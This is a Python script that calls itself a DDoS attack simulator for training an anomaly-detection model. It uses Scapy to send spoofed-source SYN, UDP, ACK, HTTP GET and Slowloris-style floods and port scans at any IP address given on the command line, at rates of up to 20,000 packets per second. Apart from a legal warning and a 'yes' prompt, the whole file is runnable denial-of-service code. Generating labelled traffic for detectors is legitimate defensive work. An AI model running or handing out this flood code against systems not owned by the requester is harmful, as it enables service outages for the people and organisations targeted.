"""
DDoS Attack Simulator for Anomaly Detection Model Training
Generates realistic attack patterns with detailed logging for labeled training data.

IMPORTANT: Only use on systems you own/control. Unauthorized DDoS is illegal.
"""

import os
import sys
import time
import random
import threading
import csv
from datetime import datetime, timedelta
from typing import List, Dict, Optional
import argparse

try:
    from scapy.all import IP, TCP, UDP, ICMP, send, conf
    from scapy.layers.inet import Raw
except ImportError:
    print("ERROR: Scapy not installed. Install with: pip install scapy")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────────────────────

class AttackConfig:
    def __init__(self, target_ip: str, duration_minutes: int, intensity: str = "variable"):
        self.target_ip = target_ip
        self.duration_minutes = duration_minutes
        self.intensity = intensity  # "light", "medium", "heavy", "variable"
        self.window_size_minutes = 10  # Attacks in 10-min windows
        self.log_file = f"ddos_training_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

        # Packet rates (packets per second) based on intensity
        self.pps_by_intensity = {
            "light": (100, 500),      # 100-500 pps
            "medium": (1000, 5000),   # 1k-5k pps
            "heavy": (5000, 20000),   # 5k-20k pps
            "variable": None          # Auto-varies
        }

# ─────────────────────────────────────────────────────────────────────────────
# Attack Types
# ─────────────────────────────────────────────────────────────────────────────

class DDoSAttackGenerator:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.is_running = False
        self.packets_sent = 0
        self.start_time = None
        self.log_data = []

        # Suppress Scapy verbose output
        conf.verb = 0

    def log_attack(self, attack_type: str, src_ip: str, dst_ip: str,
                   packets_sent: int, duration_sec: float, intensity: str):
        """Log attack details to CSV."""
        self.log_data.append({
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "packets_sent": packets_sent,
            "duration_sec": duration_sec,
            "intensity": intensity,
            "pps": packets_sent / max(duration_sec, 1)
        })

    def save_log(self):
        """Save all logged attacks to CSV."""
        if not self.log_data:
            return

        with open(self.config.log_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=self.log_data[0].keys())
            writer.writeheader()
            writer.writerows(self.log_data)

        print(f"\n[✓] Logged {len(self.log_data)} attacks to {self.config.log_file}")

    def get_random_source_ip(self) -> str:
        """Generate a random source IP (spoofed)."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def send_packets(self, packets: List, description: str):
        """Send packets and track count."""
        try:
            for pkt in packets:
                if not self.is_running:
                    break
                send(pkt, verbose=False)
                self.packets_sent += 1
        except Exception as e:
            print(f"[!] Error sending packets ({description}): {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 1: SYN Flood (Connection Exhaustion)
    # ─────────────────────────────────────────────────────────────────────────

    def syn_flood(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        SYN flood: Sends many TCP SYN packets to exhaust connection table.
        Target sees partial handshakes; wastes resources tracking them.
        """
        print(f"[→] SYN Flood attack ({intensity}) for {duration_sec}s")

        pps_min, pps_max = self.config.pps_by_intensity.get(intensity, (1000, 5000))
        pps = random.randint(pps_min, pps_max)
        delay = 1.0 / pps  # Seconds between packets

        start = time.time()
        packet_count = 0

        while time.time() - start < duration_sec and self.is_running:
            src_ip = self.get_random_source_ip()
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 22, 8080])

            pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
                sport=src_port,
                dport=dst_port,
                flags="S",  # SYN flag
                seq=random.randint(0, 2**32 - 1)
            )

            try:
                send(pkt, verbose=False)
                packet_count += 1
            except:
                pass

            time.sleep(delay)

        elapsed = time.time() - start
        self.log_attack("SYN_FLOOD", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 2: UDP Flood (Bandwidth Exhaustion)
    # ─────────────────────────────────────────────────────────────────────────

    def udp_flood(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        UDP flood: Sends many UDP packets to consume bandwidth.
        Random destination ports; no handshake overhead.
        """
        print(f"[→] UDP Flood attack ({intensity}) for {duration_sec}s")

        pps_min, pps_max = self.config.pps_by_intensity.get(intensity, (2000, 8000))
        pps = random.randint(pps_min, pps_max)
        delay = 1.0 / pps

        start = time.time()
        packet_count = 0

        while time.time() - start < duration_sec and self.is_running:
            src_ip = self.get_random_source_ip()
            src_port = random.randint(1024, 65535)
            dst_port = random.randint(1, 65535)

            payload = b"X" * random.randint(512, 1472)  # Max UDP payload

            pkt = IP(src=src_ip, dst=self.config.target_ip) / UDP(
                sport=src_port,
                dport=dst_port
            ) / Raw(load=payload)

            try:
                send(pkt, verbose=False)
                packet_count += 1
            except:
                pass

            time.sleep(delay)

        elapsed = time.time() - start
        self.log_attack("UDP_FLOOD", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 3: ACK Flood (Amplification)
    # ─────────────────────────────────────────────────────────────────────────

    def ack_flood(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        ACK flood: Sends many TCP ACK packets (looks like responses).
        Confuses stateless firewalls; wastes bandwidth.
        """
        print(f"[→] ACK Flood attack ({intensity}) for {duration_sec}s")

        pps_min, pps_max = self.config.pps_by_intensity.get(intensity, (1500, 6000))
        pps = random.randint(pps_min, pps_max)
        delay = 1.0 / pps

        start = time.time()
        packet_count = 0

        while time.time() - start < duration_sec and self.is_running:
            src_ip = self.get_random_source_ip()
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 8080, 22])

            pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
                sport=src_port,
                dport=dst_port,
                flags="A",  # ACK flag
                ack=random.randint(0, 2**32 - 1),
                seq=random.randint(0, 2**32 - 1)
            )

            try:
                send(pkt, verbose=False)
                packet_count += 1
            except:
                pass

            time.sleep(delay)

        elapsed = time.time() - start
        self.log_attack("ACK_FLOOD", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 4: HTTP GET Flood (Application Layer)
    # ─────────────────────────────────────────────────────────────────────────

    def http_get_flood(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        HTTP GET flood: Sends many HTTP GET requests.
        Targets application layer; harder to filter than L3/L4.
        """
        print(f"[→] HTTP GET Flood attack ({intensity}) for {duration_sec}s")

        pps_min, pps_max = self.config.pps_by_intensity.get(intensity, (100, 500))
        pps = random.randint(pps_min, pps_max)
        delay = 1.0 / pps

        start = time.time()
        packet_count = 0

        paths = ["/", "/index.html", "/api/login", "/api/data", "/admin", "/config.php"]

        while time.time() - start < duration_sec and self.is_running:
            src_ip = self.get_random_source_ip()
            src_port = random.randint(1024, 65535)

            path = random.choice(paths)
            http_request = f"GET {path} HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"

            pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
                sport=src_port,
                dport=80,
                flags="A"
            ) / Raw(load=http_request.encode())

            try:
                send(pkt, verbose=False)
                packet_count += 1
            except:
                pass

            time.sleep(delay)

        elapsed = time.time() - start
        self.log_attack("HTTP_FLOOD", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 5: Slowloris (Resource Starvation)
    # ─────────────────────────────────────────────────────────────────────────

    def slowloris(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        Slowloris: Keeps connections open as long as possible.
        Doesn't send much data; just holds resources.
        """
        print(f"[→] Slowloris attack ({intensity}) for {duration_sec}s")

        num_connections = random.randint(10, 50) if intensity == "light" else \
                         random.randint(50, 200) if intensity == "medium" else \
                         random.randint(200, 500)

        start = time.time()
        packet_count = 0

        while time.time() - start < duration_sec and self.is_running:
            for _ in range(num_connections):
                src_ip = self.get_random_source_ip()
                src_port = random.randint(1024, 65535)

                # Send incomplete HTTP request
                http_partial = "GET / HTTP/1.1\r\nHost: {}\r\n".format(self.config.target_ip)

                pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
                    sport=src_port,
                    dport=80,
                    flags="PA"
                ) / Raw(load=http_partial.encode())

                try:
                    send(pkt, verbose=False)
                    packet_count += 1
                except:
                    pass

            time.sleep(5)  # Send partial requests every 5 seconds

        elapsed = time.time() - start
        self.log_attack("SLOWLORIS", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

    # ─────────────────────────────────────────────────────────────────────────
    # Attack Type 6: Port Scan (Reconnaissance)
    # ─────────────────────────────────────────────────────────────────────────

    def port_scan(self, duration_sec: int = 60, intensity: str = "medium"):
        """
        Port scan: Probes many ports rapidly.
        Precursor to actual attack; indicates reconnaissance.
        """
        print(f"[→] Port Scan attack ({intensity}) for {duration_sec}s")

        pps_min, pps_max = self.config.pps_by_intensity.get(intensity, (500, 3000))
        pps = random.randint(pps_min, pps_max)
        delay = 1.0 / pps

        start = time.time()
        packet_count = 0
        src_ip = self.get_random_source_ip()

        common_ports = list(range(1, 1024)) + [3306, 5432, 5984, 6379, 8080, 8443, 9200, 27017, 50070]

        while time.time() - start < duration_sec and self.is_running:
            dst_port = random.choice(common_ports)
            src_port = random.randint(1024, 65535)

            pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
                sport=src_port,
                dport=dst_port,
                flags="S"
            )

            try:
                send(pkt, verbose=False)
                packet_count += 1
            except:
                pass

            time.sleep(delay)

        elapsed = time.time() - start
        self.log_attack("PORT_SCAN", src_ip, self.config.target_ip, packet_count, elapsed, intensity)
        print(f"    [{packet_count} packets, {packet_count/elapsed:.0f} pps]")

# ─────────────────────────────────────────────────────────────────────────────
# Main Training Loop
# ─────────────────────────────────────────────────────────────────────────────

def run_training_session(target_ip: str, duration_hours: float, intensity: str = "variable"):
    """
    Run a complete training session with mixed attack types.
    """
    duration_minutes = int(duration_hours * 60)
    config = AttackConfig(target_ip, duration_minutes, intensity)
    generator = DDoSAttackGenerator(config)
    generator.is_running = True
    generator.start_time = time.time()

    print("=" * 80)
    print(f"DDoS Attack Training Session")
    print("=" * 80)
    print(f"Target IP:        {target_ip}")
    print(f"Duration:         {duration_hours} hours ({duration_minutes} minutes)")
    print(f"Window size:      {config.window_size_minutes} minutes")
    print(f"Intensity mode:   {intensity}")
    print(f"Log file:         {config.log_file}")
    print("=" * 80)
    print("[!] Press Ctrl+C to stop the session gracefully")
    print("=" * 80 + "\n")

    attack_types = [
        generator.syn_flood,
        generator.udp_flood,
        generator.ack_flood,
        generator.http_get_flood,
        generator.slowloris,
        generator.port_scan
    ]

    try:
        window_count = 0
        session_start = time.time()

        while time.time() - session_start < duration_minutes * 60 and generator.is_running:
            window_count += 1
            window_start = time.time()

            print(f"\n[WINDOW {window_count}] {datetime.now().strftime('%H:%M:%S')}")
            print("─" * 80)

            # Randomize attack sequence and intensity per window
            attacks_this_window = random.sample(attack_types, k=random.randint(2, 4))

            if intensity == "variable":
                # Vary intensity: ramp up, then down, then random
                if window_count % 6 == 0:
                    window_intensity = "light"
                elif window_count % 6 == 1:
                    window_intensity = "medium"
                elif window_count % 6 == 2:
                    window_intensity = "heavy"
                elif window_count % 6 == 3:
                    window_intensity = "light"
                else:
                    window_intensity = random.choice(["light", "medium", "heavy"])
            else:
                window_intensity = intensity

            # Run attacks within this window
            attack_duration = config.window_size_minutes * 60 / len(attacks_this_window)

            for attack in attacks_this_window:
                if not generator.is_running:
                    break
                attack(duration_sec=int(attack_duration), intensity=window_intensity)

            # Ensure we stay in the 10-minute window
            elapsed = time.time() - window_start
            if elapsed < config.window_size_minutes * 60:
                time.sleep(config.window_size_minutes * 60 - elapsed)

    except KeyboardInterrupt:
        print("\n\n[!] Stopping training session...")
        generator.is_running = False
    finally:
        elapsed_hours = (time.time() - session_start) / 3600
        print("\n" + "=" * 80)
        print(f"Training session complete!")
        print(f"Duration: {elapsed_hours:.2f} hours")
        print(f"Total attacks logged: {len(generator.log_data)}")
        print("=" * 80)

        generator.save_log()
        print(f"\n[✓] Import this CSV into your training pipeline:")
        print(f"    python scripts/label_training_data.py {config.log_file}")

# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DDoS Attack Simulator for Anomaly Detection Training",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # 1-hour training with variable intensity (recommended)
  python ddos_attack_simulator.py --target 192.168.1.10 --duration 1 --intensity variable

  # 4-hour heavy training
  python ddos_attack_simulator.py --target 192.168.1.10 --duration 4 --intensity heavy

  # Light training for quick tests
  python ddos_attack_simulator.py --target 192.168.1.10 --duration 0.25 --intensity light
        """
    )

    parser.add_argument("--target", required=True, help="Target IP address (e.g., 192.168.1.10)")
    parser.add_argument("--duration", type=float, default=1, help="Duration in hours (default: 1)")
    parser.add_argument("--intensity", choices=["light", "medium", "heavy", "variable"],
                       default="variable", help="Attack intensity (default: variable)")

    args = parser.parse_args()

    # Validate target IP
    try:
        parts = args.target.split(".")
        if len(parts) != 4 or not all(0 <= int(p) <= 255 for p in parts):
            raise ValueError
    except:
        print(f"ERROR: Invalid IP address: {args.target}")
        sys.exit(1)

    # Confirm before starting (safety check)
    print(f"\n[⚠]  WARNING: This will simulate DDoS attacks against {args.target}")
    print(f"[⚠]  Only run on systems you own/control.")
    print(f"[⚠]  Unauthorized DDoS is illegal.\n")

    confirm = input("Type 'yes' to confirm: ").strip().lower()
    if confirm != "yes":
        print("Aborted.")
        sys.exit(0)

    run_training_session(args.target, args.duration, args.intensity)
